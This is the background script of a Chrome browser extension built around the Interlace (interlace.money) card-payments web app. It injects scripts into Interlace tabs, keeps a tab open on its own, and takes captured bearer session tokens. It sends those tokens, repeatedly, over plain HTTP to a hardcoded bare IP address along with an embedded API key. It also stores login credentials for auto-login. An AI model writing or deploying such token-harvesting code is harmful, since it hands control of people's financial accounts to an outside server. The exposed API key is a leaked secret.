const INTERLACE_DASHBOARD_URL = "https://www.interlace.money/app/#/app/dashboard";
const LEADER_STORAGE_KEY = "automationLeaderTabId";

const DEFAULT_CONFIG = {
  automationEnabled: true,
  username: "",
  password: "",
  autoLogin: true,
  autoSubmit: true,
  source: "interlace",
  submitUrl: "http://38.97.63.31:7788/api/card/verify-code/token",
  apiKey: "ccm_3Q_l7jf3yXy3KYY8Hqqy0gM9uGa3SHCc",
  openUrl: INTERLACE_DASHBOARD_URL,
  reportIntervalSeconds: 60,
  autoProbe: true,
  probeUrl: "https://assets-prod.interlace.money/api/task-progress/page",
  probeIntervalSeconds: 30
};

async function getConfig() {
  const stored = await chrome.storage.local.get(Object.keys(DEFAULT_CONFIG).concat(["lastSubmittedToken"]));
  return { ...DEFAULT_CONFIG, ...stored };
}

let logWriteQueue = Promise.resolve();

async function addLog(level, message, details = {}) {
  const entry = {
    id: `${Date.now()}-${Math.random().toString(16).slice(2)}`,
    at: Date.now(),
    level,
    message,
    details
  };

  logWriteQueue = logWriteQueue.catch(() => undefined).then(async () => {
    const { submitLogs = [] } = await chrome.storage.local.get(["submitLogs"]);
    await chrome.storage.local.set({
      submitLogs: [entry, ...submitLogs].slice(0, 50)
    });
  });

  await logWriteQueue;
  return entry;
}

async function ensureDefaults() {
  const stored = await chrome.storage.local.get(Object.keys(DEFAULT_CONFIG));
  const patch = {};

  for (const [key, value] of Object.entries(DEFAULT_CONFIG)) {
    if (stored[key] === undefined) patch[key] = value;
  }

  if (Object.keys(patch).length > 0) {
    await chrome.storage.local.set(patch);
  }
}

function cleanToken(rawAuth) {
  if (!rawAuth) return "";
  return String(rawAuth).replace(/^Bearer\s+/i, "").trim();
}

async function submitToken(rawAuth, captureMeta = {}, options = {}) {
  const config = await getConfig();
  const token = cleanToken(rawAuth);
  const force = Boolean(options.force);
  const mode = options.mode || captureMeta.mode || "capture";

  if (!config.automationEnabled || !config.autoSubmit || !token) {
    await chrome.storage.local.set({
      lastTokenEvent: {
        at: Date.now(),
        skipped: true,
        reason: `${mode}: automation/auto submit disabled or empty token`,
        hasToken: Boolean(token),
        captureMeta
      }
    });
    await addLog("warn", "跳过上报：自动化或自动上报已关闭，或 token 为空", {
      automationEnabled: config.automationEnabled,
      autoSubmit: config.autoSubmit,
      hasToken: Boolean(token),
      ...captureMeta
    });
    return { skipped: true, reason: "auto submit disabled or empty token" };
  }

  if (!force && token === config.lastSubmittedToken) {
    await chrome.storage.local.set({
      lastTokenEvent: {
        at: Date.now(),
        skipped: true,
        reason: "duplicate token",
        source: config.source || "interlace",
        tokenPreview: `${token.slice(0, 8)}...${token.slice(-6)}`,
        captureMeta
      }
    });
    await addLog("info", "跳过上报：重复 token", {
      source: config.source || "interlace",
      tokenPreview: `${token.slice(0, 8)}...${token.slice(-6)}`,
      ...captureMeta
    });
    return { skipped: true, reason: "duplicate token" };
  }

  await addLog("info", force ? "定时上报 token，开始上报" : "捕获到新 token，开始上报", {
    source: config.source || "interlace",
    tokenPreview: `${token.slice(0, 8)}...${token.slice(-6)}`,
    mode,
    force,
    ...captureMeta
  });

  let response;
  try {
    response = await fetch(config.submitUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-API-Key": config.apiKey
      },
      body: JSON.stringify({
        source: config.source || "interlace",
        token
      })
    });
  } catch (error) {
    await addLog("error", "上报请求异常", {
      error: String(error && error.message ? error.message : error),
      source: config.source || "interlace",
      ...captureMeta
    });
    throw error;
  }

  const text = await response.text();

  if (!response.ok) {
    await addLog("error", "上报失败", {
      status: response.status,
      response: text,
      source: config.source || "interlace",
      ...captureMeta
    });
    throw new Error(`token submit failed: HTTP ${response.status} ${text}`);
  }

  await chrome.storage.local.set({
    lastSubmittedToken: token,
    lastSubmitAt: Date.now(),
    lastSubmitStatus: text,
    lastCaptureMeta: captureMeta,
      lastTokenEvent: {
        at: Date.now(),
        skipped: false,
      reason: force ? "periodic submitted" : "submitted",
      source: config.source || "interlace",
      tokenPreview: `${token.slice(0, 8)}...${token.slice(-6)}`,
      captureMeta
    }
  });

  await addLog("success", "上报成功", {
    status: response.status,
    response: text,
    source: config.source || "interlace",
    mode,
    force,
    ...captureMeta
  });

  return { ok: true, status: response.status, body: text };
}

async function injectAutomation(tabId) {
  if (!tabId) return { injected: false, reason: "missing tab id" };

  await chrome.scripting.executeScript({
    target: { tabId },
    files: ["page-hook.js"],
    world: "MAIN"
  });

  await chrome.scripting.executeScript({
    target: { tabId },
    files: ["content.js"]
  });

  await addLog("info", "已向 Interlace 标签页注入自动化脚本", { tabId });
  return { injected: true, tabId };
}

async function focusOrCreateInterlaceTab(url) {
  const matches = await chrome.tabs.query({
    url: [
      "https://interlace.money/*",
      "https://www.interlace.money/*"
    ]
  });

  const existing = matches.find((tab) => tab.url && tab.url.includes("interlace.money"));
  if (existing && existing.id) {
    await chrome.tabs.update(existing.id, { active: true });
    if (existing.windowId) {
      await chrome.windows.update(existing.windowId, { focused: true });
    }
    const injection = await injectAutomation(existing.id);
    await addLog("info", "已激活现有 Interlace 标签页", {
      tabId: existing.id,
      url: existing.url,
      injected: injection.injected
    });
    return { reused: true, tabId: existing.id, url: existing.url, injected: injection.injected };
  }

  const created = await chrome.tabs.create({ url });
  await addLog("info", "已新建 Interlace 标签页", {
    tabId: created.id,
    url
  });
  return { reused: false, tabId: created.id, url };
}

async function ensureInterlaceTab(url, options = {}) {
  const matches = await chrome.tabs.query({
    url: [
      "https://interlace.money/*",
      "https://www.interlace.money/*"
    ]
  });
  const existing = matches.find((tab) => tab.url && tab.url.includes("interlace.money"));

  if (existing && existing.id) {
    const injection = options.injectExisting === false
      ? { injected: false }
      : await injectAutomation(existing.id);
    if (!options.quiet) {
      await addLog("success", "自动化已开始，复用现有 Interlace 标签页", {
        tabId: existing.id,
        url: existing.url,
        injected: injection.injected
      });
    }
    return { reused: true, created: false, tabId: existing.id, url: existing.url };
  }

  const created = await chrome.tabs.create({ url });
  await addLog("success", options.reason
    ? "未检测到 Interlace 标签页，已自动打开 Dashboard"
    : "自动化已开始，已自动打开 Interlace Dashboard", {
    tabId: created.id,
    url,
    reason: options.reason || "start"
  });
  return { reused: false, created: true, tabId: created.id, url };
}

let tabMonitorQueue = Promise.resolve();

function monitorInterlaceTab(reason) {
  tabMonitorQueue = tabMonitorQueue.catch(() => undefined).then(async () => {
    const config = await getConfig();
    if (!config.automationEnabled) return { skipped: true };
    return ensureInterlaceTab(INTERLACE_DASHBOARD_URL, {
      injectExisting: false,
      quiet: true,
      reason
    });
  });
  return tabMonitorQueue;
}

async function getAutomationStatus() {
  const config = await getConfig();
  const tabs = await chrome.tabs.query({
    url: [
      "https://interlace.money/*",
      "https://www.interlace.money/*"
    ]
  });
  const leaderTabId = await getValidLeaderTabId();
  const leaderTab = tabs.find((tab) => tab.id === leaderTabId);
  return {
    enabled: config.automationEnabled !== false,
    tabPresent: tabs.length > 0,
    tabCount: tabs.length,
    urls: tabs.map((tab) => tab.url || "").filter(Boolean),
    leaderTabId,
    leaderUrl: leaderTab && leaderTab.url || ""
  };
}

function isInterlaceUrl(url) {
  try {
    const hostname = new URL(url).hostname;
    return hostname === "interlace.money" || hostname === "www.interlace.money";
  } catch (_) {
    return false;
  }
}

async function getValidLeaderTabId() {
  const stored = await chrome.storage.session.get([LEADER_STORAGE_KEY]);
  const tabId = Number(stored[LEADER_STORAGE_KEY] || 0);
  if (!tabId) return null;

  try {
    const tab = await chrome.tabs.get(tabId);
    if (tab && isInterlaceUrl(tab.url || "")) return tabId;
  } catch (_) {
    // The previous leader tab no longer exists.
  }

  await chrome.storage.session.remove([LEADER_STORAGE_KEY]);
  return null;
}

async function broadcastLeaderStatus(leaderTabId) {
  const tabs = await chrome.tabs.query({
    url: [
      "https://interlace.money/*",
      "https://www.interlace.money/*"
    ]
  });
  await Promise.all(tabs.map(async (tab) => {
    if (!tab.id) return;
    try {
      await chrome.tabs.sendMessage(tab.id, {
        type: "SET_LEADER_STATUS",
        isLeader: tab.id === leaderTabId
      });
    } catch (_) {
      // A tab may still be loading before its content script is ready.
    }
  }));
}

let leaderQueue = Promise.resolve();

function electLeader(preferredTabId = null) {
  leaderQueue = leaderQueue.catch(() => undefined).then(async () => {
    let leaderTabId = await getValidLeaderTabId();
    const hadLeader = Boolean(leaderTabId);
    if (!leaderTabId && preferredTabId) {
      try {
        const preferred = await chrome.tabs.get(preferredTabId);
        if (preferred && isInterlaceUrl(preferred.url || "")) leaderTabId = preferredTabId;
      } catch (_) {
        // Fall through to another existing Interlace tab.
      }
    }

    if (!leaderTabId) {
      const tabs = await chrome.tabs.query({
        url: [
          "https://interlace.money/*",
          "https://www.interlace.money/*"
        ]
      });
      leaderTabId = tabs.find((tab) => tab.id)?.id || null;
    }

    if (leaderTabId) {
      await chrome.storage.session.set({ [LEADER_STORAGE_KEY]: leaderTabId });
      if (!hadLeader) {
        let leaderUrl = "";
        try {
          leaderUrl = (await chrome.tabs.get(leaderTabId)).url || "";
        } catch (_) {
          // The broadcast below will recover if the tab disappeared again.
        }
        await addLog("info", "已选定 Interlace 主标签页", {
          tabId: leaderTabId,
          url: leaderUrl
        });
      }
    } else {
      await chrome.storage.session.remove([LEADER_STORAGE_KEY]);
    }
    await broadcastLeaderStatus(leaderTabId);
    return leaderTabId;
  });
  return leaderQueue;
}

async function releaseLeaderIfNeeded(tabId) {
  const stored = await chrome.storage.session.get([LEADER_STORAGE_KEY]);
  if (Number(stored[LEADER_STORAGE_KEY] || 0) !== tabId) return false;
  await chrome.storage.session.remove([LEADER_STORAGE_KEY]);
  return true;
}

chrome.runtime.onInstalled.addListener(() => {
  ensureDefaults()
    .then(() => monitorInterlaceTab("extension-installed"))
    .then((result) => electLeader(result && result.tabId || null))
    .catch((error) => console.error("[Interlace Extension] init failed", error));
});

chrome.runtime.onStartup.addListener(() => {
  ensureDefaults()
    .then(() => monitorInterlaceTab("browser-startup"))
    .then((result) => electLeader(result && result.tabId || null))
    .catch((error) => console.error("[Interlace Extension] startup init failed", error));
});

chrome.tabs.onRemoved.addListener((tabId) => {
  (async () => {
    await releaseLeaderIfNeeded(tabId);
    const result = await monitorInterlaceTab("tab-closed");
    await electLeader(result && result.tabId || null);
  })().catch((error) => console.error("[Interlace Extension] tab monitor failed", error));
});

chrome.tabs.onUpdated.addListener((tabId, changeInfo) => {
  if (!changeInfo.url) return;
  (async () => {
    if (!isInterlaceUrl(changeInfo.url)) await releaseLeaderIfNeeded(tabId);
    const result = await monitorInterlaceTab("tab-navigated");
    await electLeader(result && result.tabId || null);
  })().catch((error) => console.error("[Interlace Extension] tab monitor failed", error));
});

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  (async () => {
    if (!message || !message.type) {
      sendResponse({ ok: false, error: "invalid message" });
      return;
    }

    if (message.type === "GET_CONFIG") {
      const config = await getConfig();
      sendResponse({ ok: true, config });
      return;
    }

    if (message.type === "SAVE_CONFIG") {
      const allowed = {};
      for (const key of Object.keys(DEFAULT_CONFIG)) {
        if (message.config && Object.prototype.hasOwnProperty.call(message.config, key)) {
          allowed[key] = message.config[key];
        }
      }
      await chrome.storage.local.set(allowed);
      sendResponse({ ok: true });
      return;
    }

    if (message.type === "OPEN_INTERLACE") {
      const result = await focusOrCreateInterlaceTab(INTERLACE_DASHBOARD_URL);
      sendResponse({ ok: true, result });
      return;
    }

    if (message.type === "START_AUTOMATION") {
      await chrome.storage.local.set({ automationEnabled: true });
      const result = await ensureInterlaceTab(INTERLACE_DASHBOARD_URL);
      const leaderTabId = await electLeader(result.tabId || null);
      sendResponse({ ok: true, result: { ...result, leaderTabId } });
      return;
    }

    if (message.type === "STOP_AUTOMATION") {
      await chrome.storage.local.set({ automationEnabled: false });
      await addLog("warn", "自动化已停止");
      sendResponse({ ok: true });
      return;
    }

    if (message.type === "GET_AUTOMATION_STATUS") {
      const status = await getAutomationStatus();
      sendResponse({ ok: true, status });
      return;
    }

    if (message.type === "CLAIM_LEADER_TAB") {
      const tabId = sender.tab && sender.tab.id;
      if (!tabId) {
        sendResponse({ ok: false, error: "missing sender tab" });
        return;
      }
      const leaderTabId = await electLeader(tabId);
      sendResponse({ ok: true, isLeader: leaderTabId === tabId, leaderTabId });
      return;
    }

    if (message.type === "GET_LOGS") {
      const { submitLogs = [], lastTokenEvent = null } = await chrome.storage.local.get(["submitLogs", "lastTokenEvent"]);
      sendResponse({ ok: true, logs: submitLogs, lastTokenEvent });
      return;
    }

    if (message.type === "CLEAR_LOGS") {
      await chrome.storage.local.set({ submitLogs: [] });
      sendResponse({ ok: true });
      return;
    }

    if (message.type === "ADD_LOG") {
      const entry = await addLog(message.level || "info", message.message || "", message.details || {});
      sendResponse({ ok: true, entry });
      return;
    }

    if (message.type === "SUBMIT_TOKEN") {
      const leaderTabId = await getValidLeaderTabId();
      if (sender.tab && sender.tab.id !== leaderTabId) {
        sendResponse({ ok: true, result: { skipped: true, reason: "standby tab" } });
        return;
      }
      const result = await submitToken(message.authorization, {
        url: message.url || "",
        via: message.via || "",
        mode: message.mode || "capture",
        tabId: sender.tab && sender.tab.id,
        pageUrl: sender.tab && sender.tab.url,
        capturedAt: Date.now()
      }, {
        force: Boolean(message.force),
        mode: message.mode || "capture"
      });
      sendResponse({ ok: true, result });
      return;
    }

    sendResponse({ ok: false, error: `unknown message type: ${message.type}` });
  })().catch((error) => {
    console.error("[Interlace Extension]", error);
    sendResponse({ ok: false, error: String(error && error.message ? error.message : error) });
  });

  return true;
});
